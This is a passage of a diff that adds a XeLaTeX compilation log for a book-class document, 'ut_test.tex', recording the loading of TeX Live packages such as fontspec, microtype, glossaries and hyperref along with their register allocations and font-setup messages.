@@ -1,0 +1,4501 @@
+This is XeTeX, Version 3.141592653-2.6-0.999995 (TeX Live 2023/Debian) (preloaded format=xelatex 2026.9.1)  1 SEP 2026 15:18
+entering extended mode
+ restricted \write18 enabled.
+ %&-line parsing enabled.
+**ut_test.tex
+(./ut_test.tex
+LaTeX2e <2023-11-01> patch level 1
+L3 programming layer <2024-01-22>
+(/usr/share/texlive/texmf-dist/tex/latex/base/book.cls
+Document Class: book 2023/05/17 v1.4n Standard LaTeX document class
+(/usr/share/texlive/texmf-dist/tex/latex/base/bk10.clo
+File: bk10.clo 2023/05/17 v1.4n Standard LaTeX file (size option)
+)
+\c@part=\count183
+\c@chapter=\count184
+\c@section=\count185
+\c@subsection=\count186
+\c@subsubsection=\count187
+\c@paragraph=\count188
+\c@subparagraph=\count189
+\c@figure=\count190
+\c@table=\count191
+\abovecaptionskip=\skip48
+\belowcaptionskip=\skip49
+\bibindent=\dimen140
+)
+(/usr/share/texlive/texmf-dist/tex/latex/geometry/geometry.sty
+Package: geometry 2020/01/02 v5.9 Page Geometry
+
+(/usr/share/texlive/texmf-dist/tex/latex/graphics/keyval.sty
+Package: keyval 2022/05/29 v1.15 key=value parser (DPC)
+\KV@toks@=\toks17
+)
+(/usr/share/texlive/texmf-dist/tex/generic/iftex/ifvtex.sty
+Package: ifvtex 2019/10/25 v1.7 ifvtex legacy package. Use iftex instead.
+
+(/usr/share/texlive/texmf-dist/tex/generic/iftex/iftex.sty
+Package: iftex 2022/02/03 v1.0f TeX engine tests
+))
+\Gm@cnth=\count192
+\Gm@cntv=\count193
+\c@Gm@tempcnt=\count194
+\Gm@bindingoffset=\dimen141
+\Gm@wd@mp=\dimen142
+\Gm@odd@mp=\dimen143
+\Gm@even@mp=\dimen144
+\Gm@layoutwidth=\dimen145
+\Gm@layoutheight=\dimen146
+\Gm@layouthoffset=\dimen147
+\Gm@layoutvoffset=\dimen148
+\Gm@dimlist=\toks18
+)
+(/usr/share/texlive/texmf-dist/tex/latex/fontspec/fontspec.sty
+(/usr/share/texlive/texmf-dist/tex/latex/l3packages/xparse/xparse.sty
+(/usr/share/texlive/texmf-dist/tex/latex/l3kernel/expl3.sty
+Package: expl3 2024-01-22 L3 programming layer (loader) 
+
+(/usr/share/texlive/texmf-dist/tex/latex/l3backend/l3backend-xetex.def
+File: l3backend-xetex.def 2024-01-04 L3 backend support: XeTeX
+\g__graphics_track_int=\count195
+\l__pdf_internal_box=\box51
+\g__pdf_backend_object_int=\count196
+\g__pdf_backend_annotation_int=\count197
+\g__pdf_backend_link_int=\count198
+))
+Package: xparse 2023-10-10 L3 Experimental document command parser
+)
+Package: fontspec 2022/01/15 v2.8a Font selection for XeLaTeX and LuaLaTeX
+
+(/usr/share/texlive/texmf-dist/tex/latex/fontspec/fontspec-xetex.sty
+Package: fontspec-xetex 2022/01/15 v2.8a Font selection for XeLaTeX and LuaLaTe
+X
+\l__fontspec_script_int=\count199
+\l__fontspec_language_int=\count266
+\l__fontspec_strnum_int=\count267
+\l__fontspec_tmp_int=\count268
+\l__fontspec_tmpa_int=\count269
+\l__fontspec_tmpb_int=\count270
+\l__fontspec_tmpc_int=\count271
+\l__fontspec_em_int=\count272
+\l__fontspec_emdef_int=\count273
+\l__fontspec_strong_int=\count274
+\l__fontspec_strongdef_int=\count275
+\l__fontspec_tmpa_dim=\dimen149
+\l__fontspec_tmpb_dim=\dimen150
+\l__fontspec_tmpc_dim=\dimen151
+
+(/usr/share/texlive/texmf-dist/tex/latex/base/fontenc.sty
+Package: fontenc 2021/04/29 v2.0v Standard LaTeX package
+)
+(/usr/share/texlive/texmf-dist/tex/latex/fontspec/fontspec.cfg)))
+(/usr/share/texlive/texmf-dist/tex/latex/titlesec/titlesec.sty
+Package: titlesec 2023/10/27 v2.16 Sectioning titles
+\ttl@box=\box52
+\beforetitleunit=\skip50
+\aftertitleunit=\skip51
+\ttl@plus=\dimen152
+\ttl@minus=\dimen153
+\ttl@toksa=\toks19
+\titlewidth=\dimen154
+\titlewidthlast=\dimen155
+\titlewidthfirst=\dimen156
+)
+(/usr/share/texlive/texmf-dist/tex/latex/imakeidx/imakeidx.sty
+Package: imakeidx 2016/10/15 v1.3e Package for typesetting indices in a synchro
+nous mode
+
+(/usr/share/texlive/texmf-dist/tex/latex/xkeyval/xkeyval.sty
+Package: xkeyval 2022/06/16 v2.9 package option processing (HA)
+
+(/usr/share/texlive/texmf-dist/tex/generic/xkeyval/xkeyval.tex
+(/usr/share/texlive/texmf-dist/tex/generic/xkeyval/xkvutils.tex
+\XKV@toks=\toks20
+\XKV@tempa@toks=\toks21
+)
+\XKV@depth=\count276
+File: xkeyval.tex 2014/12/03 v2.7a key=value parser (HA)
+))
+(/usr/share/texlive/texmf-dist/tex/generic/iftex/ifxetex.sty
+Package: ifxetex 2019/10/25 v0.7 ifxetex legacy package. Use iftex instead.
+)
+(/usr/share/texlive/texmf-dist/tex/generic/iftex/ifluatex.sty
+Package: ifluatex 2019/10/25 v1.5 ifluatex legacy package. Use iftex instead.
+)
+(/usr/share/texlive/texmf-dist/tex/latex/tools/multicol.sty
+Package: multicol 2023/03/30 v1.9f multicolumn formatting (FMi)
+\c@tracingmulticols=\count277
+\mult@box=\box53
+\multicol@leftmargin=\dimen157
+\c@unbalance=\count278
+\c@collectmore=\count279
+\doublecol@number=\count280
+\multicoltolerance=\count281
+\multicolpretolerance=\count282
+\full@width=\dimen158
+\page@free=\dimen159
+\premulticols=\dimen160
+\postmulticols=\dimen161
+\multicolsep=\skip52
+\multicolbaselineskip=\skip53
+\partial@page=\box54
+\last@line=\box55
+\mc@boxedresult=\box56
+\maxbalancingoverflow=\dimen162
+\mult@rightbox=\box57
+\mult@grightbox=\box58
+\mult@firstbox=\box59
+\mult@gfirstbox=\box60
+\@tempa=\box61
+\@tempa=\box62
+\@tempa=\box63
+\@tempa=\box64
+\@tempa=\box65
+\@tempa=\box66
+\@tempa=\box67
+\@tempa=\box68
+\@tempa=\box69
+\@tempa=\box70
+\@tempa=\box71
+\@tempa=\box72
+\@tempa=\box73
+\@tempa=\box74
+\@tempa=\box75
+\@tempa=\box76
+\@tempa=\box77
+\@tempa=\box78
+\@tempa=\box79
+\@tempa=\box80
+\@tempa=\box81
+\@tempa=\box82
+\@tempa=\box83
+\@tempa=\box84
+\@tempa=\box85
+\@tempa=\box86
+\@tempa=\box87
+\@tempa=\box88
+\@tempa=\box89
+\@tempa=\box90
+\@tempa=\box91
+\@tempa=\box92
+\@tempa=\box93
+\@tempa=\box94
+\@tempa=\box95
+\@tempa=\box96
+\c@minrows=\count283
+\c@columnbadness=\count284
+\c@finalcolumnbadness=\count285
+\last@try=\dimen163
+\multicolovershoot=\dimen164
+\multicolundershoot=\dimen165
+\mult@nat@firstbox=\box97
+\colbreak@box=\box98
+\mc@col@check@num=\count286
+))
+\ut_test@idxfile=\write3
+\openout3 = `ut_test.idx'.
+
+
+Writing index file ut_test.idx
+
+Package fontspec Info: Font family 'LiberationSerif(0)' created for font
+(fontspec)             'Liberation Serif' with options [Ligatures=TeX].
+(fontspec)              
+(fontspec)              This font family consists of the following NFSS
+(fontspec)             series/shapes:
+(fontspec)              
+(fontspec)             - 'normal' (m/n) with NFSS spec.: <->"Liberation
+(fontspec)             Serif/OT:script=latn;language=dflt;mapping=tex-text;"
+(fontspec)             - 'small caps'  (m/sc) with NFSS spec.: 
+(fontspec)             - 'bold' (b/n) with NFSS spec.: <->"Liberation
+(fontspec)             Serif/B/OT:script=latn;language=dflt;mapping=tex-text;"
+(fontspec)             - 'bold small caps'  (b/sc) with NFSS spec.: 
+(fontspec)             - 'italic' (m/it) with NFSS spec.: <->"Liberation
+(fontspec)             Serif/I/OT:script=latn;language=dflt;mapping=tex-text;"
+(fontspec)             - 'italic small caps'  (m/scit) with NFSS spec.: 
+(fontspec)             - 'bold italic' (b/it) with NFSS spec.: <->"Liberation
+(fontspec)             Serif/BI/OT:script=latn;language=dflt;mapping=tex-text;"
+
+(fontspec)             - 'bold italic small caps'  (b/scit) with NFSS spec.: 
+
+
+Package fontspec Info: Font family 'LiberationMono(0)' created for font
+(fontspec)             'Liberation Mono' with options
+(fontspec)             [WordSpace={1,0,0},HyphenChar=None,PunctuationSpace=Word
+Space,Scale=1.0].
+(fontspec)              
+(fontspec)              This font family consists of the following NFSS
+(fontspec)             series/shapes:
+(fontspec)              
+(fontspec)             - 'normal' (m/n) with NFSS spec.: <->s*[1.0]"Liberation
+(fontspec)             Mono/OT:script=latn;language=dflt;"
+(fontspec)             - 'small caps'  (m/sc) with NFSS spec.: 
+(fontspec)             and font adjustment code:
+(fontspec)             \fontdimen 2\font =1\fontdimen 2\font \fontdimen 3\font
+(fontspec)             =0\fontdimen 3\font \fontdimen 4\font =0\fontdimen
+(fontspec)             4\font \fontdimen 7\font =0\fontdimen 2\font
+(fontspec)             \tex_hyphenchar:D \font =-1\scan_stop: 
+(fontspec)             - 'bold' (b/n) with NFSS spec.: <->s*[1.0]"Liberation
+(fontspec)             Mono/B/OT:script=latn;language=dflt;"
+(fontspec)             - 'bold small caps'  (b/sc) with NFSS spec.: 
+(fontspec)             and font adjustment code:
+(fontspec)             \fontdimen 2\font =1\fontdimen 2\font \fontdimen 3\font
+(fontspec)             =0\fontdimen 3\font \fontdimen 4\font =0\fontdimen
+(fontspec)             4\font \fontdimen 7\font =0\fontdimen 2\font
+(fontspec)             \tex_hyphenchar:D \font =-1\scan_stop: 
+(fontspec)             - 'italic' (m/it) with NFSS spec.:
+(fontspec)             <->s*[1.0]"Liberation
+(fontspec)             Mono/I/OT:script=latn;language=dflt;"
+(fontspec)             - 'italic small caps'  (m/scit) with NFSS spec.: 
+(fontspec)             and font adjustment code:
+(fontspec)             \fontdimen 2\font =1\fontdimen 2\font \fontdimen 3\font
+(fontspec)             =0\fontdimen 3\font \fontdimen 4\font =0\fontdimen
+(fontspec)             4\font \fontdimen 7\font =0\fontdimen 2\font
+(fontspec)             \tex_hyphenchar:D \font =-1\scan_stop: 
+(fontspec)             - 'bold italic' (b/it) with NFSS spec.:
+(fontspec)             <->s*[1.0]"Liberation
+(fontspec)             Mono/BI/OT:script=latn;language=dflt;"
+(fontspec)             - 'bold italic small caps'  (b/scit) with NFSS spec.: 
+(fontspec)             and font adjustment code:
+(fontspec)             \fontdimen 2\font =1\fontdimen 2\font \fontdimen 3\font
+(fontspec)             =0\fontdimen 3\font \fontdimen 4\font =0\fontdimen
+(fontspec)             4\font \fontdimen 7\font =0\fontdimen 2\font
+(fontspec)             \tex_hyphenchar:D \font =-1\scan_stop: 
+
+
+Package fontspec Info: Font family 'LiberationSans(0)' created for font
+(fontspec)             'Liberation Sans' with options [].
+(fontspec)              
+(fontspec)              This font family consists of the following NFSS
+(fontspec)             series/shapes:
+(fontspec)              
+(fontspec)             - 'normal' (m/n) with NFSS spec.: <->"Liberation
+(fontspec)             Sans/OT:script=latn;language=dflt;"
+(fontspec)             - 'small caps'  (m/sc) with NFSS spec.: 
+(fontspec)             - 'bold' (b/n) with NFSS spec.: <->"Liberation
+(fontspec)             Sans/B/OT:script=latn;language=dflt;"
+(fontspec)             - 'bold small caps'  (b/sc) with NFSS spec.: 
+(fontspec)             - 'italic' (m/it) with NFSS spec.: <->"Liberation
+(fontspec)             Sans/I/OT:script=latn;language=dflt;"
+(fontspec)             - 'italic small caps'  (m/scit) with NFSS spec.: 
+(fontspec)             - 'bold italic' (b/it) with NFSS spec.: <->"Liberation
+(fontspec)             Sans/BI/OT:script=latn;language=dflt;"
+(fontspec)             - 'bold italic small caps'  (b/scit) with NFSS spec.: 
+
+(/usr/share/texlive/texmf-dist/tex/latex/microtype/microtype.sty
+Package: microtype 2023/03/13 v3.1a Micro-typographical refinements (RS)
+
+(/usr/share/texlive/texmf-dist/tex/latex/etoolbox/etoolbox.sty
+Package: etoolbox 2020/10/05 v2.5k e-TeX tools for LaTeX (JAW)
+\etb@tempcnta=\count287
+)
+\MT@toks=\toks22
+\MT@tempbox=\box99
+\MT@count=\count288
+LaTeX Info: Redefining \noprotrusionifhmode on input line 1059.
+LaTeX Info: Redefining \leftprotrusion on input line 1060.
+\MT@prot@toks=\toks23
+LaTeX Info: Redefining \rightprotrusion on input line 1078.
+LaTeX Info: Redefining \textls on input line 1368.
+\MT@outer@kern=\dimen166
+LaTeX Info: Redefining \textmicrotypecontext on input line 1988.
+\MT@listname@count=\count289
+
+(/usr/share/texlive/texmf-dist/tex/latex/microtype/microtype-xetex.def
+File: microtype-xetex.def 2023/03/13 v3.1a Definitions specific to xetex (RS)
+LaTeX Info: Redefining \lsstyle on input line 238.
+)
+Package microtype Info: Loading configuration file microtype.cfg.
+
+(/usr/share/texlive/texmf-dist/tex/latex/microtype/microtype.cfg
+File: microtype.cfg 2023/03/13 v3.1a microtype main configuration file (RS)
+))
+(/usr/share/texlive/texmf-dist/tex/latex/seqsplit/seqsplit.sty
+Package: seqsplit 2006/08/07 v0.1 Splitting long sequences (DNA, RNA, proteins,
+ etc.) 
+)
+(/usr/share/texlive/texmf-dist/tex/latex/fancyhdr/fancyhdr.sty
+Package: fancyhdr 2022/11/09 v4.1 Extensive control of page headers and footers
+
+\f@nch@headwidth=\skip54
+\f@nch@O@elh=\skip55
+\f@nch@O@erh=\skip56
+\f@nch@O@olh=\skip57
+\f@nch@O@orh=\skip58
+\f@nch@O@elf=\skip59
+\f@nch@O@erf=\skip60
+\f@nch@O@olf=\skip61
+\f@nch@O@orf=\skip62
+)
+(/usr/share/texlive/texmf-dist/tex/latex/float/float.sty
+Package: float 2001/11/08 v1.3d Float enhancements (AL)
+\c@float@type=\count290
+\float@exts=\toks24
+\float@box=\box100
+\@float@everytoks=\toks25
+\@floatcapt=\box101
+)
+(/usr/share/texlive/texmf-dist/tex/latex/endnotes/endnotes.sty
+Invalid UTF-8 byte or sequence at line 118 replaced by U+FFFD.
+Invalid UTF-8 byte or sequence at line 118 replaced by U+FFFD.
+Invalid UTF-8 byte or sequence at line 121 replaced by U+FFFD.
+Invalid UTF-8 byte or sequence at line 121 replaced by U+FFFD.
+Package: endnotes 2020-01-02 endnotes package
+\c@endnote=\count291
+\endnotesep=\dimen167
+\@enotes=\write4
+)
+\c@endnotechapter=\count292
+
+(/usr/share/texlive/texmf-dist/tex/latex/graphics/rotating.sty
+Package: rotating 2016/08/11 v2.16d rotated objects in LaTeX
+
+(/usr/share/texlive/texmf-dist/tex/latex/graphics/graphicx.sty
+Package: graphicx 2021/09/16 v1.2d Enhanced LaTeX Graphics (DPC,SPQR)
+
+(/usr/share/texlive/texmf-dist/tex/latex/graphics/graphics.sty
+Package: graphics 2022/03/10 v1.4e Standard LaTeX Graphics (DPC,SPQR)
+
+(/usr/share/texlive/texmf-dist/tex/latex/graphics/trig.sty
+Package: trig 2021/08/11 v1.11 sin cos tan (DPC)
+)
+(/usr/share/texlive/texmf-dist/tex/latex/graphics-cfg/graphics.cfg
+File: graphics.cfg 2016/06/04 v1.11 sample graphics configuration
+)
+Package graphics Info: Driver file: xetex.def on input line 107.
+
+(/usr/share/texlive/texmf-dist/tex/latex/graphics-def/xetex.def
+File: xetex.def 2022/09/22 v5.0n Graphics/color driver for xetex
+))
+\Gin@req@height=\dimen168
+\Gin@req@width=\dimen169
+)
+(/usr/share/texlive/texmf-dist/tex/latex/base/ifthen.sty
+Package: ifthen 2022/04/13 v1.1d Standard LaTeX ifthen package (DPC)
+)
+\c@r@tfl@t=\count293
+\rotFPtop=\skip63
+\rotFPbot=\skip64
+\rot@float@box=\box102
+\rot@mess@toks=\toks26
+)
+(/usr/share/texlive/texmf-dist/tex/latex/placeins/placeins.sty
+Package: placeins 2005/04/18  v 2.2
+)
+(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amsmath.sty
+Package: amsmath 2023/05/13 v2.17o AMS math features
+\@mathmargin=\skip65
+
+For additional information on amsmath, use the `?' option.
+(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amstext.sty
+Package: amstext 2021/08/26 v2.01 AMS text
+
+(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amsgen.sty
+File: amsgen.sty 1999/11/30 v2.0 generic functions
+\@emptytoks=\toks27
+\ex@=\dimen170
+))
+(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amsbsy.sty
+Package: amsbsy 1999/11/29 v1.2d Bold Symbols
+\pmbraise@=\dimen171
+)
+(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amsopn.sty
+Package: amsopn 2022/04/08 v2.04 operator names
+)
+\inf@bad=\count294
+LaTeX Info: Redefining \frac on input line 234.
+\uproot@=\count295
+\leftroot@=\count296
+LaTeX Info: Redefining \overline on input line 399.
+LaTeX Info: Redefining \colon on input line 410.
+\classnum@=\count297
+\DOTSCASE@=\count298
+LaTeX Info: Redefining \ldots on input line 496.
+LaTeX Info: Redefining \dots on input line 499.
+LaTeX Info: Redefining \cdots on input line 620.
+\Mathstrutbox@=\box103
+\strutbox@=\box104
+LaTeX Info: Redefining \big on input line 722.
+LaTeX Info: Redefining \Big on input line 723.
+LaTeX Info: Redefining \bigg on input line 724.
+LaTeX Info: Redefining \Bigg on input line 725.
+\big@size=\dimen172
+LaTeX Font Info:    Redeclaring font encoding OML on input line 743.
+LaTeX Font Info:    Redeclaring font encoding OMS on input line 744.
+\macc@depth=\count299
+LaTeX Info: Redefining \bmod on input line 905.
+LaTeX Info: Redefining \pmod on input line 910.
+LaTeX Info: Redefining \smash on input line 940.
+LaTeX Info: Redefining \relbar on input line 970.
+LaTeX Info: Redefining \Relbar on input line 971.
+\c@MaxMatrixCols=\count300
+\dotsspace@=\muskip16
+\c@parentequation=\count301
+\dspbrk@lvl=\count302
+\tag@help=\toks28
+\row@=\count303
+\column@=\count304
+\maxfields@=\count305
+\andhelp@=\toks29
+\eqnshift@=\dimen173
+\alignsep@=\dimen174
+\tagshift@=\dimen175
+\tagwidth@=\dimen176
+\totwidth@=\dimen177
+\lineht@=\dimen178
+\@envbody=\toks30
+\multlinegap=\skip66
+\multlinetaggap=\skip67
+\mathdisplay@stack=\toks31
+LaTeX Info: Redefining \[ on input line 2953.
+LaTeX Info: Redefining \] on input line 2954.
+)
+(/usr/share/texlive/texmf-dist/tex/latex/glossaries/base/glossaries.sty
+Package: glossaries 2023/09/29 v4.53 (NLCT)
+
+(/usr/share/texlive/texmf-dist/tex/latex/mfirstuc/mfirstuc.sty
+Package: mfirstuc 2022/10/14 v2.08 (NLCT)
+\@glsmfirst=\toks32
+\@glsmrest=\toks33
+)
+(/usr/share/texlive/texmf-dist/tex/latex/xfor/xfor.sty
+Package: xfor 2009/02/05 v1.05 (NLCT)
+)
+(/usr/share/texlive/texmf-dist/tex/latex/datatool/datatool-base.sty
+Package: datatool-base 2019/09/27 v2.32 (NLCT)
+
+(/usr/share/texlive/texmf-dist/tex/latex/substr/substr.sty
+Package: substr 2009/10/20 v1.2 Handle substrings
+\c@su@anzahl=\count306
+)
+(/usr/share/texlive/texmf-dist/tex/latex/datatool/datatool-fp.sty
+Package: datatool-fp 2019/09/27 v2.32 (NLCT)
+
+(/usr/share/texlive/texmf-dist/tex/latex/fp/fp.sty
+Package: fp 1995/04/02
+
+`Fixed Point Package', Version 0.8, April 2, 1995 (C) Michael Mehlich
+(/usr/share/texlive/texmf-dist/tex/latex/fp/defpattern.sty
+Package: defpattern 1994/10/12
+\actioncount=\count307
+)
+(/usr/share/texlive/texmf-dist/tex/latex/fp/fp-basic.sty
+Package: fp-basic 1996/05/13
+\FP@xs=\count308
+\FP@xia=\count309
+\FP@xib=\count310
+\FP@xfa=\count311
+\FP@xfb=\count312
+\FP@rega=\count313
+\FP@regb=\count314
+\FP@regs=\count315
+\FP@times=\count316
+)
+(/usr/share/texlive/texmf-dist/tex/latex/fp/fp-addons.sty
+Package: fp-addons 1995/03/15
+)
+(/usr/share/texlive/texmf-dist/tex/latex/fp/fp-snap.sty
+Package: fp-snap 1995/04/05
+)
+(/usr/share/texlive/texmf-dist/tex/latex/fp/fp-exp.sty
+Package: fp-exp 1995/04/03
+)
+(/usr/share/texlive/texmf-dist/tex/latex/fp/fp-trigo.sty
+Package: fp-trigo 1995/04/14
+)
+(/usr/share/texlive/texmf-dist/tex/latex/fp/fp-pas.sty
+Package: fp-pas 1994/08/29
+)
+(/usr/share/texlive/texmf-dist/tex/latex/fp/fp-random.sty
+Package: fp-random 1995/02/23
+\FPseed=\count317
+)
+(/usr/share/texlive/texmf-dist/tex/latex/fp/fp-eqn.sty
+Package: fp-eqn 1995/04/03
+)
+(/usr/share/texlive/texmf-dist/tex/latex/fp/fp-upn.sty
+Package: fp-upn 1996/10/21
+)
+(/usr/share/texlive/texmf-dist/tex/latex/fp/fp-eval.sty
+Package: fp-eval 1995/04/03
+)))
+\@dtl@toks=\toks34
+\@dtl@tmpcount=\count318
+\dtl@tmplength=\skip68
+\dtl@sortresult=\count319
+\@dtl@numgrpsepcount=\count320
+\@dtl@datatype=\count321
+\dtl@codeA=\count322
+\dtl@codeB=\count323
+\@dtl@foreach@level=\count324
+)
+\gls@level=\count325
+\@gls@tmpb=\toks35
+\gls@tmplen=\skip69
+\glskeylisttok=\toks36
+\glslabeltok=\toks37
+\glsshorttok=\toks38
+\glslongtok=\toks39
+
+(/usr/share/texlive/texmf-dist/tex/latex/glossaries/styles/glossary-hypernav.st
+y
+Package: glossary-hypernav 2023/09/29 v4.53 (NLCT)
+) (/usr/share/texlive/texmf-dist/tex/latex/glossaries/styles/glossary-list.sty
+Package: glossary-list 2023/09/29 v4.53 (NLCT)
+\glslistdottedwidth=\skip70
+) (/usr/share/texlive/texmf-dist/tex/latex/glossaries/styles/glossary-long.sty
+Package: glossary-long 2023/09/29 v4.53 (NLCT)
+
+(/usr/share/texlive/texmf-dist/tex/latex/tools/longtable.sty
+Package: longtable 2023-11-01 v4.19 Multi-page Table package (DPC)
+\LTleft=\skip71
+\LTright=\skip72
+\LTpre=\skip73
+\LTpost=\skip74
+\LTchunksize=\count326
+\LTcapwidth=\dimen179
+\LT@head=\box105
+\LT@firsthead=\box106
+\LT@foot=\box107
+\LT@lastfoot=\box108
+\LT@gbox=\box109
+\LT@cols=\count327
+\LT@rows=\count328
+\c@LT@tables=\count329
+\c@LT@chunks=\count330
+\LT@p@ftn=\toks40
+)
+\glsdescwidth=\skip75
+\glspagelistwidth=\skip76
+)
+(/usr/share/texlive/texmf-dist/tex/latex/glossaries/styles/glossary-super.sty
+Package: glossary-super 2023/09/29 v4.53 (NLCT)
+
+(/usr/share/texlive/texmf-dist/tex/latex/supertabular/supertabular.sty
+Package: supertabular 2020/02/02 v4.1g the supertabular environment
+\c@tracingst=\count331
+\ST@wd=\dimen180
+\ST@rightskip=\skip77
+\ST@leftskip=\skip78
+\ST@parfillskip=\skip79
+\ST@pageleft=\dimen181
+\ST@headht=\dimen182
+\ST@tailht=\dimen183
+\ST@pagesofar=\dimen184
+\ST@pboxht=\dimen185
+\ST@lineht=\dimen186
+\ST@prevht=\dimen187
+\ST@toadd=\dimen188
+\ST@dimen=\dimen189
+\ST@pbox=\box110
+))
+(/usr/share/texlive/texmf-dist/tex/latex/glossaries/styles/glossary-tree.sty
+Package: glossary-tree 2023/09/29 v4.53 (NLCT)
+\glstreeindent=\skip80
+))
+\glswrite=\write5
+\glo@main@file=\write6
+\openout6 = `ut_test.glo'.
+
+Package glossaries Info: Writing glossary file ut_test.glo on input line 115.
+
+(./glossary.tex) (/usr/share/texlive/texmf-dist/tex/latex/hyperref/hyperref.sty
+Package: hyperref 2024-01-20 v7.01h Hypertext links for LaTeX
+(/usr/share/texlive/texmf-dist/tex/latex/kvsetkeys/kvsetkeys.sty
+Package: kvsetkeys 2022-10-05 v1.19 Key value parser (HO)
+)
+(/usr/share/texlive/texmf-dist/tex/generic/kvdefinekeys/kvdefinekeys.sty
+Package: kvdefinekeys 2019-12-19 v1.6 Define keys (HO)
+)
+(/usr/share/texlive/texmf-dist/tex/generic/pdfescape/pdfescape.sty
+Package: pdfescape 2019/12/09 v1.15 Implements pdfTeX's escape features (HO)
+
+(/usr/share/texlive/texmf-dist/tex/generic/ltxcmds/ltxcmds.sty
+Package: ltxcmds 2023-12-04 v1.26 LaTeX kernel commands for general use (HO)
+)
+(/usr/share/texlive/texmf-dist/tex/generic/pdftexcmds/pdftexcmds.sty
+Package: pdftexcmds 2020-06-27 v0.33 Utility functions of pdfTeX for LuaTeX (HO
+)
+
+(/usr/share/texlive/texmf-dist/tex/generic/infwarerr/infwarerr.sty
+Package: infwarerr 2019/12/03 v1.5 Providing info/warning/error messages (HO)
+)
+Package pdftexcmds Info: \pdf@primitive is available.
+Package pdftexcmds Info: \pdf@ifprimitive is available.
+Package pdftexcmds Info: \pdfdraftmode not found.
+))
+(/usr/share/texlive/texmf-dist/tex/latex/hycolor/hycolor.sty
+Package: hycolor 2020-01-27 v1.10 Color options for hyperref/bookmark (HO)
+)
+(/usr/share/texlive/texmf-dist/tex/latex/auxhook/auxhook.sty
+Package: auxhook 2019-12-17 v1.6 Hooks for auxiliary files (HO)
+)
+(/usr/share/texlive/texmf-dist/tex/latex/hyperref/nameref.sty
+Package: nameref 2023-11-26 v2.56 Cross-referencing by name of section
+
+(/usr/share/texlive/texmf-dist/tex/latex/refcount/refcount.sty
+Package: refcount 2019/12/15 v3.6 Data extraction from label references (HO)
+)
+(/usr/share/texlive/texmf-dist/tex/generic/gettitlestring/gettitlestring.sty
+Package: gettitlestring 2019/12/15 v1.6 Cleanup title references (HO)
+
+(/usr/share/texlive/texmf-dist/tex/latex/kvoptions/kvoptions.sty
+Package: kvoptions 2022-06-15 v3.15 Key value format for package options (HO)
+))
+\c@section@level=\count332
+)
+\@linkdim=\dimen190
+\Hy@linkcounter=\count333
+\Hy@pagecounter=\count334
+
+(/usr/share/texlive/texmf-dist/tex/latex/hyperref/pd1enc.def
+File: pd1enc.def 2024-01-20 v7.01h Hyperref: PDFDocEncoding definition (HO)
+)
+(/usr/share/texlive/texmf-dist/tex/generic/intcalc/intcalc.sty
+Package: intcalc 2019/12/15 v1.3 Expandable calculations with integers (HO)
+)
+\Hy@SavedSpaceFactor=\count335
+
+(/usr/share/texlive/texmf-dist/tex/latex/hyperref/puenc.def
+File: puenc.def 2024-01-20 v7.01h Hyperref: PDF Unicode definition (HO)
+)
+Package hyperref Info: Option `colorlinks' set `true' on input line 4062.
+Package hyperref Info: Hyper figures OFF on input line 4179.
+Package hyperref Info: Link nesting OFF on input line 4184.
+Package hyperref Info: Hyper index ON on input line 4187.
+Package hyperref Info: Plain pages OFF on input line 4194.
+Package hyperref Info: Backreferencing OFF on input line 4199.
+Package hyperref Info: Implicit mode ON; LaTeX internals redefined.
+Package hyperref Info: Bookmarks ON on input line 4446.
+\c@Hy@tempcnt=\count336
+
+(/usr/share/texlive/texmf-dist/tex/latex/url/url.sty
+\Urlmuskip=\muskip17
+Package: url 2013/09/16  ver 3.4  Verb mode for urls, etc.
+)
+LaTeX Info: Redefining \url on input line 4784.
+\XeTeXLinkMargin=\dimen191
+
+(/usr/share/texlive/texmf-dist/tex/generic/bitset/bitset.sty
+Package: bitset 2019/12/09 v1.3 Handle bit-vector datatype (HO)
+
+(/usr/share/texlive/texmf-dist/tex/generic/bigintcalc/bigintcalc.sty
+Package: bigintcalc 2019/12/15 v1.5 Expandable calculations on big integers (HO
+)
+))
+\Fld@menulength=\count337
+\Field@Width=\dimen192
+\Fld@charsize=\dimen193
+Package hyperref Info: Hyper figures OFF on input line 6063.
+Package hyperref Info: Link nesting OFF on input line 6068.
+Package hyperref Info: Hyper index ON on input line 6071.
+Package hyperref Info: backreferencing OFF on input line 6078.
+Package hyperref Info: Link coloring ON on input line 6081.
+Package hyperref Info: Link coloring with OCG OFF on input line 6088.
+Package hyperref Info: PDF/A mode OFF on input line 6093.
+
+(/usr/share/texlive/texmf-dist/tex/latex/base/atbegshi-ltx.sty
+Package: atbegshi-ltx 2021/01/10 v1.0c Emulation of the original atbegshi
+package with kernel methods
+)
+\Hy@abspage=\count338
+\c@Item=\count339
+\c@Hfootnote=\count340
+)
+Package hyperref Info: Driver (autodetected): hxetex.
+
+(/usr/share/texlive/texmf-dist/tex/latex/hyperref/hxetex.def
+File: hxetex.def 2024-01-20 v7.01h Hyperref driver for XeTeX
+
+(/usr/share/texlive/texmf-dist/tex/generic/stringenc/stringenc.sty
+Package: stringenc 2019/11/29 v1.12 Convert strings between diff. encodings (HO
+)
+)
+\pdfm@box=\box111
+\c@Hy@AnnotLevel=\count341
+\HyField@AnnotCount=\count342
+\Fld@listcount=\count343
+\c@bookmark@seq@number=\count344
+
+(/usr/share/texlive/texmf-dist/tex/latex/rerunfilecheck/rerunfilecheck.sty
+Package: rerunfilecheck 2022-07-10 v1.10 Rerun checks for auxiliary files (HO)
+
+(/usr/share/texlive/texmf-dist/tex/latex/base/atveryend-ltx.sty
+Package: atveryend-ltx 2020/08/19 v1.0a Emulation of the original atveryend pac
+kage
+with kernel methods
+)
+(/usr/share/texlive/texmf-dist/tex/generic/uniquecounter/uniquecounter.sty
+Package: uniquecounter 2019/12/15 v1.4 Provide unlimited unique counter (HO)
+)
+Package uniquecounter Info: New unique counter `rerunfilecheck' on input line 2
+85.
+)
+\Hy@SectionHShift=\skip81
+)
+(/usr/share/texlive/texmf-dist/tex/latex/xurl/xurl.sty
+Package: xurl 2022/01/09 v 0.10 modify URL breaks
+)
+(/usr/share/texlive/texmf-dist/tex/latex/enumitem/enumitem.sty
+Package: enumitem 2019/06/20 v3.9 Customized lists
+\labelindent=\skip82
+\enit@outerparindent=\dimen194
+\enit@toks=\toks41
+\enit@inbox=\box112
+\enit@count@id=\count345
+\enitdp@description=\count346
+)
